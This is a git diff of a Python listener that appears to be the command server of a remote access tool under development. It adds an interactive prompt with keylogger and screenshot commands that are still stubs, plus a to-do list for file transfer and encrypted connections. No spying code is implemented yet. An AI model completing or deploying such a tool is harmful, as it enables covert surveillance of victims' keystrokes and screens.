@@ -2,6 +2,13 @@ import socket
 import threading
 from os import getenv
 from dotenv import load_dotenv
+import sys
+
+# TO DO LIST
+# add file download upload
+# encrypt the connection
+# beautify terminal
+# send commands to the client side to start the modules
 
 
 # Load .env    
@@ -11,16 +18,19 @@ LPORT = getenv("LPORT","1911")
 RECV_SIZE = int(getenv("RECV_SIZE","1024"))
 ENCODING = str(getenv("ENCODE","utf-8"))
 OUT_FILE="output.txt"
+PROMPT = getenv("PROMPT","$ ")
+
 
 def handle_client(client_socket, addr):
-    print(f"Connection from {addr}")
+    print(f"\nConnection from {addr}")
     try:
         while True:
             data = client_socket.recv(RECV_SIZE)
             if not data:
                 break
             message = data.decode(ENCODING)
-            print(f"Received from {addr}: {message}")
+            sys.stdout.write(f"\nReceived from {addr}: {message}\n{PROMPT}")
+            sys.stdout.flush()
     except Exception as e:
         print(f"Error with client {addr}: {e}")
     finally:
@@ -36,16 +46,6 @@ def start_server(LPORT=LPORT):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     
-    print("""\
-    
-    ___          ___    _  _____
-  ,' _/ /7 _ __ / o | .' \/_  _/
- _\ `. //_7\V //  ,' / o / / /  
-/___,'//\\\\  )//_/`_\/_n_/ /_/   
-           //                   
-
-    """)
-    
     try:
         LPORT = int(LPORT)
     except ValueError:
@@ -58,7 +58,8 @@ def start_server(LPORT=LPORT):
         print("Port number must lower then 65535")
     server.bind((LHOST, LPORT))
     server.listen(5)
-    print(f"TCP Server listening on {LHOST}:{LPORT}")
+    sys.stdout.write(f"\nTCP Server listening on {LHOST}:{LPORT}\n{PROMPT}")
+    sys.stdout.flush()
 
     try:
         while True:
@@ -71,20 +72,54 @@ def start_server(LPORT=LPORT):
     finally:
         server.close()
 
-def help():
-    pass
-def keylogger():
-    pass
+def terminal(args):
+    def help_command():
+        print("Available commands:", ", ".join(commands.keys()))
 
+    def keylogger_command():
+        print("keylogger started")
+        # will send command to the client side to start the keylogger module
 
-def cli(args):
-    command_list = ["help", "keylogger"]
-    if args not in command_list:
-        print("Available commands: " + ", ".join(command_list))
+    def screenshot_command():
+        print("screenshot started")
+        # will send command to the client side to start the screenshot module
+
+    def exit_command():
+        print("Goodbye.")
+        sys.exit(0)
+
+    commands = {
+        "help": help_command,
+        "keylogger": keylogger_command,
+        "screenshot": screenshot_command,
+        "exit": exit_command,
+    }
+
+    command = commands.get(args)
+    if command:
+        command()
     else:
-        for i in range(len(command_list)):
-            if args == command_list[i]:
-                # todo
+        print("Invalid command. Available commands:", ", ".join(commands.keys()))
                 
 if __name__ == "__main__":
-    start_server()
+
+    print(r"""
+    
+    ___          ___    _  _____
+  ,' _/ /7 _ __ / o | .' \/_  _/
+ _\ `. //_7\V //  ,' / o / / /  
+/___,'//\\  )//_/`_\/_n_/ /_/   
+           //                   
+
+    """)
+
+    # Start server listener
+    listening_thread = threading.Thread(target=start_server, daemon=True)
+    listening_thread.start()
+
+    try:
+        while True:
+            user_command = input(f"\n{PROMPT}")
+            terminal(user_command)
+    except KeyboardInterrupt:
+        print("\n[!] Interrupted. Exiting...")
